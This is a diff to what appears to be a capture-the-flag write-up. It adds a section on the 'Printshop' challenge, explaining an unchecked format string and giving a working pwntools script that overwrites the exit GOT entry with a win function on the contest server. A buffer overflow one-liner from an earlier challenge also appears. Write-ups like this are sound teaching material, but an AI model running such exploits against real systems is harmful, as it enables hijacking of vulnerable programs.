@@ -15,7 +15,33 @@ To do so, I generated a long string using python and piped it to the program.
 python -c "print('A'*400)" | ./guessinggame
 ```
 
-This gives the flag ! 
+This gives the flag !
+
+## Printshop
+
+We're once again given an ELF file. The source code is the following : 
+
+[Source Code](/Images/printshop.png)
+
+The vulnerability here lies in the fact the the format of the input is not checked, meaning that we can print out value from the stack : 
+
+[Vulnerability](/Images/printshop2.png)
+
+Next, we can use the magic of pwntools and use the function fmtstr_payload. We know that the next function to be executed is exit so we can overwrite its GOT address with this of the win function :
+
+```python
+from pwn import *
+
+elf = ELF("./printshop")
+context.binary = elf
+
+p = remote("chal.pctf.competitivecyber.club", 7997)
+
+p.recvrepeat(1)
+p.sendline(fmtstr_payload(6, {elf.got["exit"] : elf.symbols["win"]}))
+
+p.interactive()
+```
 
 # Forensics
 
